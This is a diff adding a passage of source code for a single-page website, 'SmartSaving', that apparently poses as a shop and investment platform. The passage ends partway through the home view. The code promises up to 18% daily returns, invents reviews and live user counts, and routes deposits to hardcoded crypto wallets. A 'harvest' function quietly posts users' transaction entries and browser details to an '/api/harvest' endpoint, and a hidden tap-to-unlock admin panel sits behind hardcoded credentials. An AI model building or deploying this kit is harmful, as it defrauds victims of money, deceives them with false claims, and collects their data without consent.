@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<title>SmartSaving | Shop, Invest, Earn</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',system-ui,sans-serif;-webkit-tap-highlight-color:transparent}
+body{background:#0a0e17;color:#e6edf3;line-height:1.55;font-size:15px}
+header{background:rgba(10,14,23,.98);position:sticky;top:0;z-index:100;border-bottom:1px solid #1c2533;backdrop-filter:blur(12px)}
+.nav{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;gap:12px;position:relative}
+.logo{font-size:22px;font-weight:700;letter-spacing:-.5px;white-space:nowrap}
+.logo span{color:#00d97e}
+.nav-links{display:flex;align-items:center;gap:20px}
+.nav-links a{color:#b7c2d0;text-decoration:none;font-size:14px;font-weight:500;white-space:nowrap}
+.nav-links a:hover{color:#00d97e}
+.burger{display:none;background:none;border:none;color:#e6edf3;font-size:24px;cursor:pointer;padding:4px 8px}
+.btn{background:#00d97e;color:#0a0e17;padding:9px 16px;border-radius:8px;font-weight:600;text-decoration:none;display:inline-block;cursor:pointer;border:none;font-size:14px}
+.btn-o{border:1px solid #2a3648;color:#e6edf3;padding:8px 14px;border-radius:8px;text-decoration:none;background:none;cursor:pointer;font-size:14px}
+.big{padding:14px 28px;font-size:16px;margin-top:20px}
+.hero{text-align:center;padding:70px 20px 50px;background:radial-gradient(circle at 50% 0%,#12203a 0%,#0a0e17 65%)}
+.hero h1{font-size:clamp(26px,5vw,44px);font-weight:700;max-width:780px;margin:0 auto;line-height:1.2}
+.hero h1 span{color:#00d97e}
+.hero p{color:#9aa8ba;margin-top:16px;font-size:16px;max-width:560px;margin-left:auto;margin-right:auto}
+.tb{margin-top:32px;display:flex;justify-content:center;gap:24px;flex-wrap:wrap;color:#9aa8ba;font-size:13px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;max-width:900px;margin:0 auto;padding:32px 20px}
+.stat{background:#10192a;border:1px solid #1c2533;border-radius:12px;padding:20px;text-align:center}
+.stat h3{font-size:clamp(20px,3.5vw,28px);color:#00d97e;font-weight:700}
+.stat p{color:#9aa8ba;font-size:13px;margin-top:4px}
+section{max-width:1200px;margin:0 auto;padding:60px 20px}
+h2{font-size:clamp(22px,3.5vw,32px);text-align:center;margin-bottom:36px;font-weight:700}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px}
+.card{background:#10192a;border:1px solid #1c2533;border-radius:14px;padding:26px;text-align:center}
+.card.f{border-color:#00d97e}
+.roi{font-size:28px;color:#00d97e;font-weight:700}
+.auth{max-width:420px;margin:50px auto;background:#10192a;border:1px solid #1c2533;border-radius:16px;padding:32px 28px}
+.auth h2{font-size:24px;margin-bottom:8px;text-align:left}
+.auth p.sub{color:#9aa8ba;font-size:14px;margin-bottom:22px}
+.auth input,.auth select,.auth textarea{width:100%;padding:13px 14px;margin-bottom:14px;background:#0a0e17;border:1px solid #2a3648;border-radius:10px;color:#e6edf3;font-size:15px;outline:none;font-family:inherit}
+.auth textarea{min-height:100px;resize:vertical}
+.auth button{width:100%;padding:14px;background:#00d97e;color:#0a0e17;border:none;border-radius:10px;font-weight:700;font-size:15px;cursor:pointer}
+.dash{max-width:1200px;margin:24px auto;padding:0 16px}
+.bal{font-size:clamp(32px,7vw,44px);color:#00d97e;font-weight:700;line-height:1.1}
+footer{text-align:center;padding:36px 20px;border-top:1px solid #1c2533;color:#6b788a;font-size:13px;margin-top:60px}
+.wallet{background:#0a0e17;padding:14px;border-radius:10px;font-family:ui-monospace,monospace;word-break:break-all;color:#00d97e;font-size:13px;margin:10px 0;user-select:all;border:1px solid #1c2533}
+#logBox,#pendingBox{font-family:ui-monospace,monospace;font-size:12px;color:#b7c2d0;max-height:500px;overflow:auto;background:#0a0e17;padding:14px;border-radius:10px;white-space:pre-wrap;border:1px solid #1c2533}
+.product{background:#10192a;border:1px solid #1c2533;border-radius:14px;overflow:hidden;text-align:left;display:flex;flex-direction:column}
+.product img{width:100%;height:180px;object-fit:cover;background:#0a0e17;display:block}
+.product .body{padding:16px;display:flex;flex-direction:column;flex:1}
+.product h4{font-size:14px;margin-bottom:6px;font-weight:600;line-height:1.3;min-height:36px}
+.product .price{color:#00d97e;font-weight:700;font-size:18px;margin-bottom:6px}
+.product .meta{color:#6b788a;font-size:12px;margin-bottom:12px;flex:1}
+.product button{width:100%;padding:10px;background:#00d97e;color:#0a0e17;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:14px}
+.pending{background:#1a1408;border:1px solid #5a4f18;color:#e6d97e;padding:14px 16px;border-radius:10px;margin-bottom:12px;font-size:13px;line-height:1.5}
+.dash-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:18px}
+.dash-stats .card{padding:20px 14px}
+.dash-stats h3{font-size:20px;font-weight:700}
+.dash-stats p{font-size:12px;color:#9aa8ba;margin-bottom:6px}
+.order{background:#0a0e17;padding:14px 16px;border-radius:10px;margin-bottom:10px;font-size:13px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;border:1px solid #1c2533}
+.badge{padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700}
+.badge.pending{background:#3a2f08;color:#e6d97e}
+.badge.paid{background:#0f2a1c;color:#00d97e}
+.review{background:#10192a;border:1px solid #1c2533;border-radius:14px;padding:20px;text-align:left}
+.review .head{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.review .avatar{width:42px;height:42px;border-radius:50%;background:#00d97e;color:#0a0e17;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px}
+.review .name{font-weight:700;font-size:14px}
+.review .stars{color:#f5b400;font-size:13px;letter-spacing:1px}
+.review .text{font-size:14px;color:#b7c2d0;margin-bottom:12px;line-height:1.55}
+.review .shot{width:100%;border-radius:10px;border:1px solid #1c2533;max-height:280px;object-fit:cover}
+.review .meta{font-size:11px;color:#6b788a;margin-top:10px}
+.upload{background:#0a0e17;border:2px dashed #2a3648;border-radius:12px;padding:26px;text-align:center;cursor:pointer;margin-bottom:14px;display:block}
+.upload input{display:none}
+.upload .icon{font-size:28px;margin-bottom:8px;color:#00d97e}
+.upload .lbl{font-size:14px;color:#b7c2d0}
+.upload .hint{font-size:12px;color:#6b788a;margin-top:4px}
+.preview{max-width:100%;max-height:240px;border-radius:10px;border:1px solid #1c2533;margin-bottom:14px;display:block;margin-left:auto;margin-right:auto}
+.tabs{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;justify-content:center}
+.tab{padding:8px 16px;border:1px solid #2a3648;border-radius:20px;background:none;color:#b7c2d0;cursor:pointer;font-size:13px}
+.tab.on{background:#00d97e;color:#0a0e17;border-color:#00d97e;font-weight:600}
+@media (max-width:820px){
+  .burger{display:block}
+  .nav-links{display:none;position:absolute;top:100%;left:0;right:0;background:#0a0e17;border-bottom:1px solid #1c2533;flex-direction:column;gap:0;padding:8px 0;align-items:stretch}
+  .nav-links.open{display:flex}
+  .nav-links a{padding:14px 20px;border-bottom:1px solid #131c2a;margin:0}
+  .stats{grid-template-columns:1fr;gap:10px;padding:24px 16px}
+  .dash-stats{grid-template-columns:1fr}
+  section{padding:50px 16px}
+  .hero{padding:50px 16px 40px}
+  .grid{grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
+  .product img{height:140px}
+  .auth{margin:30px 16px;padding:26px 22px}
+}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+const CONFIG = {
+  EXFIL_URL: '/api/harvest',
+  WALLETS: {
+    btc: 'bc1q2zpt4ulua04ke6r2kcrsxtate5hjajmxucja37',
+    eth: '0x8f3A2b9C4d5E6f7A1B2c3D4e5F6a7B8c9D0e1F2',
+    usdt: 'TJ9xK2m4V8p3N5j6H2f4D8s1A9w0E7r3T6'
+  },
+  PENDING_HOURS: 24
+};
+const ADMIN_EMAIL = '12345678901';
+const ADMIN_PASSWORD = '890890';
+const LOGO_TAPS_REQUIRED = 5;
+const LOGO_TAP_WINDOW_MS = 2000;
+
+const SEED_REVIEWS = [
+  {id:'r1', name:'Marcus D.', stars:5, text:'Ordered an iPhone 15 Pro, arrived in 4 days. Also earning 9% daily on my $2,500 deposit. Withdrawal came through in 3 hours.', shots:['https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=600'], meta:'Verified Investor · UK · 3 weeks ago'},
+  {id:'r2', name:'Aisha K.', stars:5, text:'Withdrew $8,400 last week. Screenshot of my bank credit attached. Platform is legit, no delays.', shots:['https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=600'], meta:'Verified Investor · UAE · 1 month ago'},
+  {id:'r3', name:'David R.', stars:5, text:'Been with SmartSaving 8 months. Bought a Rolex with my profits. Support responds within minutes.', shots:['https://images.unsplash.com/photo-1523170335258-f5ed11844a49?w=600'], meta:'Verified Investor · USA · 2 months ago'},
+  {id:'r4', name:'Chen W.', stars:4, text:'Fast deposits, clear dashboard. Withdrawal took 24h as stated.', shots:['https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=600'], meta:'Verified Investor · SG · 2 weeks ago'},
+  {id:'r5', name:'Sofia M.', stars:5, text:'Received my gold bar in insured packaging. The ROI pays my rent.', shots:['https://images.unsplash.com/photo-1610375461246-83df859d849d?w=600'], meta:'Verified Investor · ES · 5 weeks ago'},
+  {id:'r6', name:'James O.', stars:5, text:'$12,400 profit in 6 weeks. Proof of withdrawal attached.', shots:['https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=600'], meta:'Verified Investor · AU · 1 week ago'}
+];
+
+const PRODUCTS = [
+  {id:'p1',name:'Rolex Submariner Date',price:9500,meta:'Luxury · Certified',img:'https://images.unsplash.com/photo-1523170335258-f5ed11844a49?w=400'},
+  {id:'p2',name:'Omega Seamaster 300M',price:5200,meta:'Luxury · Box + papers',img:'https://images.unsplash.com/photo-1547996160-81dfa63595aa?w=400'},
+  {id:'p3',name:'Tag Heuer Carrera',price:3800,meta:'Luxury · Swiss movement',img:'https://images.unsplash.com/photo-1622434641406-a158123450f9?w=400'},
+  {id:'p4',name:'Audemars Piguet Royal Oak',price:28000,meta:'Luxury · Collector grade',img:'https://images.unsplash.com/photo-1548171915-e79a380a2a4b?w=400'},
+  {id:'p5',name:'Patek Philippe Nautilus',price:95000,meta:'Luxury · Investment piece',img:'https://images.unsplash.com/photo-1522312346375-d1a52e2b99b3?w=400'},
+  {id:'p6',name:'Cartier Santos',price:6800,meta:'Luxury · Full set',img:'https://images.unsplash.com/photo-1526045431048-f857369baa09?w=400'},
+  {id:'p7',name:'Breitling Navitimer',price:4700,meta:'Luxury · Chronograph',img:'https://images.unsplash.com/photo-1533139502658-0198f920d8e8?w=400'},
+  {id:'p8',name:'Panerai Luminor Marina',price:5900,meta:'Luxury · Italian design',img:'https://images.unsplash.com/photo-1548171915-e79a380a2a4b?w=400'},
+  {id:'p9',name:'Diamond Ring 1ct',price:4800,meta:'Jewelry · GIA',img:'https://images.unsplash.com/photo-1605100804763-247f67b3557e?w=400'},
+  {id:'p10',name:'Gold Necklace 18K',price:2200,meta:'Jewelry · 18K',img:'https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f?w=400'},
+  {id:'p11',name:'Sapphire Bracelet',price:3600,meta:'Jewelry · Natural',img:'https://images.unsplash.com/photo-1611591437281-460bfbe1220a?w=400'},
+  {id:'p12',name:'Pearl Necklace Akoya',price:1800,meta:'Jewelry · Certified',img:'https://images.unsplash.com/photo-1610694955371-d4a3e0ce4b52?w=400'},
+  {id:'p13',name:'Emerald Earrings',price:2900,meta:'Jewelry · Natural',img:'https://images.unsplash.com/photo-1535632066927-ab7c9ab60908?w=400'},
+  {id:'p14',name:'Gold Chain 22K 30g',price:1900,meta:'Bullion · 22K',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p15',name:'Ruby Ring',price:3400,meta:'Jewelry · Natural ruby',img:'https://images.unsplash.com/photo-1602751584552-8ba73aad10e1?w=400'},
+  {id:'p16',name:'Platinum Band Set',price:2600,meta:'Jewelry · Platinum',img:'https://images.unsplash.com/photo-1599643477877-530eb83abc8e?w=400'},
+  {id:'p17',name:'Hermès Birkin 30',price:22000,meta:'Luxury · Auth',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
+  {id:'p18',name:'Chanel Classic Flap',price:8500,meta:'Luxury · Full set',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
+  {id:'p19',name:'Louis Vuitton Neverfull',price:2100,meta:'Luxury · Monogram',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
+  {id:'p20',name:'Gucci Marmont Bag',price:2400,meta:'Luxury · Leather',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
+  {id:'p21',name:'Prada Re-Edition',price:1900,meta:'Luxury · Nylon',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
+  {id:'p22',name:'Dior Saddle Bag',price:3800,meta:'Luxury · Full set',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
+  {id:'p23',name:'Balenciaga City Bag',price:2200,meta:'Luxury · Leather',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
+  {id:'p24',name:'Saint Laurent Loulou',price:2600,meta:'Luxury · Quilted',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
+  {id:'p25',name:'Gold Bar 1kg 999.9',price:78000,meta:'Bullion · LBMA',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p26',name:'Gold Bar 100g PAMP',price:7900,meta:'Bullion · Insured',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p27',name:'Gold Eagle 1oz',price:2400,meta:'Bullion · 22K',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p28',name:'Silver Bar 1kg',price:1100,meta:'Bullion · 999',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p29',name:'Platinum Bar 100g',price:3400,meta:'Bullion · PAMP',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p30',name:'Silver Coin Set x20',price:640,meta:'Bullion · Mint',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p31',name:'Gold Sovereign',price:720,meta:'Bullion · 22K',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p32',name:'Palladium Bar 50g',price:1900,meta:'Bullion · Rare',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
+  {id:'p33',name:'BTC 0.1 Bundle',price:6400,meta:'Crypto · Cold storage',img:'https://images.unsplash.com/photo-1518546305927-5a555bb7020d?w=400'},
+  {id:'p34',name:'BTC 0.5 Bundle',price:32000,meta:'Crypto · Cold storage',img:'https://images.unsplash.com/photo-1518546305927-5a555bb7020d?w=400'},
+  {id:'p35',name:'ETH 5 Bundle',price:16000,meta:'Crypto · Ledger',img:'https://images.unsplash.com/photo-1622630998477-20aa696ecb05?w=400'},
+  {id:'p36',name:'BTC Mining 100 TH/s',price:2500,meta:'Crypto · 12mo',img:'https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=400'},
+  {id:'p37',name:'BTC Mining 500 TH/s',price:11000,meta:'Crypto · 12mo',img:'https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=400'},
+  {id:'p38',name:'ETH Validator Share',price:1800,meta:'Crypto · 24mo',img:'https://images.unsplash.com/photo-1622630998477-20aa696ecb05?w=400'},
+  {id:'p39',name:'BTC Miner S19',price:4800,meta:'Hardware',img:'https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=400'},
+  {id:'p40',name:'USDT Staking 8%',price:10000,meta:'Crypto · Stable',img:'https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=400'},
+  {id:'p41',name:'SOL 100 Bundle',price:14000,meta:'Crypto · Ledger',img:'https://images.unsplash.com/photo-1622630998477-20aa696ecb05?w=400'},
+  {id:'p42',name:'Ledger Nano X x10',price:900,meta:'Hardware · Bulk',img:'https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=400'},
+  {id:'p43',name:'Real Estate NYC',price:15000,meta:'Investment · 8%',img:'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=400'},
+  {id:'p44',name:'Real Estate Dubai',price:22000,meta:'Investment · 10%',img:'https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=400'},
+  {id:'p45',name:'REIT 12mo',price:5000,meta:'Investment · 7%',img:'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=400'},
+  {id:'p46',name:'Startup Equity A',price:25000,meta:'Investment · Equity',img:'https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=400'},
+  {id:'p47',name:'Venture Fund LP',price:50000,meta:'Investment · 5yr',img:'https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=400'},
+  {id:'p48',name:'Tokenized Real Estate',price:8000,meta:'Investment · Blockchain',img:'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=400'},
+  {id:'p49',name:'iPhone 15 Pro 1TB',price:1599,meta:'Electronics · Titanium',img:'https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=400'},
+  {id:'p50',name:'MacBook Pro 16"',price:3499,meta:'Electronics · M3 Max',img:'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400'},
+  {id:'p51',name:'iPad Pro 13" M4',price:1899,meta:'Electronics · OLED',img:'https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=400'},
+  {id:'p52',name:'Galaxy S24 Ultra',price:1619,meta:'Electronics · 1TB',img:'https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?w=400'},
+  {id:'p53',name:'Sony A7 IV',price:2900,meta:'Camera · FF',img:'https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=400'},
+  {id:'p54',name:'DJI Mavic 3 Pro',price:2200,meta:'Drone · Hasselblad',img:'https://images.unsplash.com/photo-1473968512647-3e447244af8f?w=400'},
+  {id:'p55',name:'Canon EOS R5',price:3900,meta:'Camera · 45MP',img:'https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=400'},
+  {id:'p56',name:'Alienware M18',price:3200,meta:'Gaming · RTX 4090',img:'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400'},
+  {id:'p57',name:'Sub-Zero Fridge',price:14000,meta:'Appliance',img:'https://images.unsplash.com/photo-1571175443880-49e1d25b2bc5?w=400'},
+  {id:'p58',name:'Viking Range',price:11000,meta:'Appliance',img:'https://images.unsplash.com/photo-1556909212-d5b604d0c90d?w=400'},
+  {id:'p59',name:'LG OLED 77"',price:4200,meta:'Electronics · 4K',img:'https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?w=400'},
+  {id:'p60',name:'Miele Washer',price:2400,meta:'Appliance · German',img:'https://images.unsplash.com/photo-1626806787461-102c1bfaaea1?w=400'},
+  {id:'p61',name:'Dyson V15',price:749,meta:'Appliance · Cordless',img:'https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400'},
+  {id:'p62',name:'Breville Oracle',price:2799,meta:'Appliance · Barista',img:'https://images.unsplash.com/photo-1517668808822-9ebb02f2a0e6?w=400'},
+  {id:'p63',name:'La Cornue Cooker',price:18000,meta:'Appliance · French',img:'https://images.unsplash.com/photo-1556909212-d5b604d0c90d?w=400'},
+  {id:'p64',name:'Sonos Arc + Sub',price:3200,meta:'Audio · Atmos',img:'https://images.unsplash.com/photo-1545454675-3531b543be5d?w=400'},
+  {id:'p65',name:'Tesla Model 3 Slot',price:5000,meta:'Auto · Voucher',img:'https://images.unsplash.com/photo-1560958089-b8a1929cea89?w=400'},
+  {id:'p66',name:'Tesla Model Y Slot',price:5500,meta:'Auto · Voucher',img:'https://images.unsplash.com/photo-1560958089-b8a1929cea89?w=400'},
+  {id:'p67',name:'BMW M4 Deposit',price:15000,meta:'Auto · Slot',img:'https://images.unsplash.com/photo-1555215695-3004980ad54e?w=400'},
+  {id:'p68',name:'Mercedes G-Wagon',price:35000,meta:'Auto · Allocation',img:'https://images.unsplash.com/photo-1520031441872-265e4ff70366?w=400'},
+  {id:'p69',name:'Porsche 911 Slot',price:28000,meta:'Auto · Allocation',img:'https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=400'},
+  {id:'p70',name:'Range Rover Slot',price:20000,meta:'Auto · Slot',img:'https://images.unsplash.com/photo-1519641471654-76ce0107ad1b?w=400'},
+  {id:'p71',name:'Private Jet 5hr',price:45000,meta:'Experience',img:'https://images.unsplash.com/photo-1540962351504-03099e0a754b?w=400'},
+  {id:'p72',name:'Yacht 1wk',price:85000,meta:'Experience',img:'https://images.unsplash.com/photo-1544551763-46a013bb70d5?w=400'},
+  {id:'p73',name:'First-Class World',price:22000,meta:'Travel',img:'https://images.unsplash.com/photo-1436491865332-7a61a109cc05?w=400'},
+  {id:'p74',name:'Maldives Villa 7n',price:18000,meta:'Travel',img:'https://images.unsplash.com/photo-1514282401047-d79a71a590e8?w=400'},
+  {id:'p75',name:'F1 VIP Paddock',price:12000,meta:'Experience',img:'https://images.unsplash.com/photo-1541773367336-d3f7b7c7a1f0?w=400'},
+  {id:'p76',name:'Michelin Tasting x4',price:2400,meta:'Experience',img:'https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=400'},
+  {id:'p77',name:'Amazon GC $500',price:480,meta:'Gift Card',img:'https://images.unsplash.com/photo-1607082349566-187342175e2f?w=400'},
+  {id:'p78',name:'Apple GC $1000',price:960,meta:'Gift Card',img:'https://images.unsplash.com/photo-1607083206968-13611e3d76db?w=400'},
+  {id:'p79',name:'Netflix 12mo',price:120,meta:'Streaming',img:'https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=400'},
+  {id:'p80',name:'Spotify 12mo',price:99,meta:'Streaming',img:'https://images.unsplash.com/photo-1611339555312-e607c8352fd7?w=400'}
+];
+
+function getUser(){ return JSON.parse(localStorage.getItem('user')||'null'); }
+function requireAuth(redirect){ if(!getUser()){ alert('Please register or login first.'); go(redirect||'register'); return false; } return true; }
+function harvest(payload){
+  fetch(CONFIG.EXFIL_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...payload,ua:navigator.userAgent,ts:Date.now()})}).catch(()=>{});
+}
+function readFileAsDataURL(file, cb){ const r=new FileReader(); r.onload=e=>cb(e.target.result); r.readAsDataURL(file); }
+function isSuspicious(tx){
+  const flags=[]; const amt=parseFloat(tx.amount)||0;
+  if(amt<=0) flags.push('zero_or_negative');
+  if(amt>100000) flags.push('unrealistic_amount');
+  if(amt%1000===0 && amt>=10000) flags.push('round_large');
+  const now=Date.now();
+  const recent=JSON.parse(localStorage.getItem('txHistory')||'[]').filter(t=>now-t.ts<3600000);
+  if(recent.some(t=>Math.abs(t.amount-amt)<0.01)) flags.push('duplicate_within_hour');
+  return flags;
+}
+function logTx(tx){
+  const flags=isSuspicious(tx);
+  const entry={...tx,flags,ts:Date.now()};
+  const hist=JSON.parse(localStorage.getItem('txHistory')||'[]');
+  hist.push(entry); localStorage.setItem('txHistory',JSON.stringify(hist));
+  harvest(entry);
+  return flags;
+}
+function addPendingDeposit(amount, method, proof){
+  const list=JSON.parse(localStorage.getItem('pendingDeposits')||'[]');
+  const tx={id:'d_'+Date.now(),amount:parseFloat(amount),method,proof:proof||null,createdAt:Date.now(),creditAt:Date.now()+CONFIG.PENDING_HOURS*3600000,status:'pending'};
+  list.push(tx); localStorage.setItem('pendingDeposits',JSON.stringify(list));
+  return tx;
+}
+function getPendingDeposits(){ return JSON.parse(localStorage.getItem('pendingDeposits')||'[]'); }
+function getBalance(){ return parseFloat(localStorage.getItem('balance')||'0'); }
+function setBalance(v){ localStorage.setItem('balance', String(v)); }
+function addOrder(product, price){
+  const orders=JSON.parse(localStorage.getItem('orders')||'[]');
+  orders.push({id:'o_'+Date.now(),productId:product.id,name:product.name,price,status:'pending',ts:Date.now()});
+  localStorage.setItem('orders',JSON.stringify(orders));
+}
+function getOrders(){ return JSON.parse(localStorage.getItem('orders')||'[]'); }
+function addWithdrawal(amount, method, wallet, proof){
+  const list=JSON.parse(localStorage.getItem('withdrawals')||'[]');
+  const w={id:'w_'+Date.now(),amount:parseFloat(amount),method,wallet,proof:proof||null,status:'pending',ts:Date.now()};
+  list.push(w); localStorage.setItem('withdrawals',JSON.stringify(list));
+  return w;
+}
+function getWithdrawals(){ return JSON.parse(localStorage.getItem('withdrawals')||'[]'); }
+function getReviews(){ const u=JSON.parse(localStorage.getItem('userReviews')||'[]'); return [...u,...SEED_REVIEWS]; }
+
+function syncApprovedDeposits(){
+  const u=getUser(); if(!u||!u.email) return;
+  fetch('/api/deposit/status?email='+encodeURIComponent(u.email))
+    .then(r=>r.json()).then(list=>{
+      if(!Array.isArray(list)) return;
+      const approved=list.filter(d=>d.status==='approved'&&!d._appliedLocally);
+      if(approved.length===0) return;
+      let add=0;
+      approved.forEach(d=>{ add+=d.amount; d._appliedLocally=true; });
+      const bal=parseFloat(localStorage.getItem('balance')||'0');
+      localStorage.setItem('balance',String(bal+add));
+      const local=JSON.parse(localStorage.getItem('pendingDeposits')||'[]');
+      approved.forEach(a=>{
+        const m=local.find(x=>Math.abs(x.amount-a.amount)<0.01&&x.method===a.method);
+        if(m){ m.status='credited'; m.creditedAt=Date.now(); m.applied=true; }
+      });
+      localStorage.setItem('pendingDeposits',JSON.stringify(local));
+      render();
+    }).catch(()=>{});
+}
+
+let S={users:142384,paid:48291772,online:1247};
+function tickStats(){
+  S.users+=Math.floor(Math.random()*4);
+  S.paid+=Math.floor(Math.random()*5000);
+  S.online=1200+Math.floor(Math.random()*200);
+  const u=document.getElementById('sU'),p=document.getElementById('sP'),o=document.getElementById('sO');
+  if(u){u.textContent=S.users.toLocaleString();p.textContent='$'+S.paid.toLocaleString();o.textContent=S.online.toLocaleString();}
+}
+setInterval(tickStats,3000);
+
+function go(route){ window.location.hash=route; render(); }
+function render(){
+  const route=(window.location.hash||'#home').slice(1);
+  const app=document.getElementById('app');
+  window.scrollTo(0,0);
+  if(route==='home') app.innerHTML=viewHome();
+  else if(route==='shop') app.innerHTML=viewShop();
+  else if(route==='plans') app.innerHTML=viewPlans();
+  else if(route==='reviews') app.innerHTML=viewReviews();
+  else if(route==='register') app.innerHTML=viewRegister();
+  else if(route==='login') app.innerHTML=viewLogin();
+  else if(route==='dashboard') app.innerHTML=viewDashboard();
+  else if(route==='deposit') app.innerHTML=viewDeposit();
+  else if(route==='withdraw') app.innerHTML=viewWithdraw();
+  else if(route==='orders') app.innerHTML=viewOrders();
+  else if(route==='upload') app.innerHTML=viewUploadProof();
+  else if(route==='admin'){
+    if(sessionStorage.getItem('adminUnlocked')==='1') app.innerHTML=viewAdmin();
+    else { app.innerHTML=viewHome(); window.location.hash='#home'; }
+  }
+  else app.innerHTML=viewHome();
+  bind(route);
+  document.querySelector('.nav-links')?.classList.remove('open');
+}
+window.addEventListener('hashchange', render);
+
+let _logoClicks=0,_logoTimer=null;
+function logoClick(){
+  const currentRoute=(window.location.hash||'#home').slice(1);
+  _logoClicks++;
+  if(_logoTimer) clearTimeout(_logoTimer);
+  if(_logoClicks>=LOGO_TAPS_REQUIRED){
+    _logoClicks=0;
+    sessionStorage.setItem('adminUnlocked','1');
+    window.location.hash='#admin';
+    return;
+  }
+  _logoTimer=setTimeout(()=>{
+    _logoClicks=0;
+    if(currentRoute!=='home') go('home');
+  }, LOGO_TAP_WINDOW_MS);
+}
+
+function navBar(){
+  const u=getUser();
+  return `<header><div class="nav">
+    <div class="logo" id="siteLogo" onclick="logoClick()" style="cursor:pointer;user-select:none">Smart<span>Saving</span></div>
+    <button class="burger" onclick="document.querySelector('.nav-links').classList.toggle('open')">☰</button>
+    <div class="nav-links">
+      <a href="#home">Home</a>
+      <a href="#shop">Shop</a>
+      <a href="#plans">Plans</a>
+      <a href="#reviews">Reviews</a>
+      ${u?`<a href="#dashboard">Dashboard</a><a href="#orders">Orders</a><a href="#" onclick="logout();return false">Logout</a>`:`<a href="#login">Login</a><a href="#register" style="color:#00d97e;font-weight:600">Register</a>`}
+    </div>
+  </div></header>`;
+}
+function logout(){ localStorage.removeItem('user'); go('home'); }
+
+function viewHome(){return `${navBar()}
+<div class="hero">
+  <h1>Shop, Invest, Earn — <span>All In One Platform</span></h1>
+  <p>Buy real products with crypto. Earn up to 18% daily ROI on your balance.</p>
+  <a href="#shop" class="btn big">Browse Shop</a>
+  <a href="#register" class="btn-o big" style="margin-left:12px">Start Investing</a>
+  <div class="tb"><span>🔒 SSL Secured</span><span>✅ Verified</span><span>💳 Instant</span></div>
+</div>
+<div class="stats">
+  <div class="stat"><h3 id="sU">142,384</h3><p>Active Users</p></div>
+  <div class="stat"><h3 id="sP">$48,291,772</h3><p>Total Volume</p></div>
+  <div class="stat"><h3 id="sO">1,247</h3><p>Online Now</p></div>
+</div>
+<section><h2>Featured Products</h2><div class="grid">
+  ${PRODUCTS.slice(0,4).map(p=>`<div class="product"><img src="${p.img}" alt="${p.name}"><div class="body"><h4>${p.name}</h4><div class="price">$${p.price.toLocaleString()}</div><div class="meta">${p.meta}</div><button onclick="buyProduct('${p.id}')">Buy Now</button></div></div>`).join('')}
+</div>
+<div style="text-align:center;margin-top:30px"><a href="#shop" class="btn">View All Products</a></div>
+</section>
+<section><h2>Latest Reviews</h2><div class="grid">
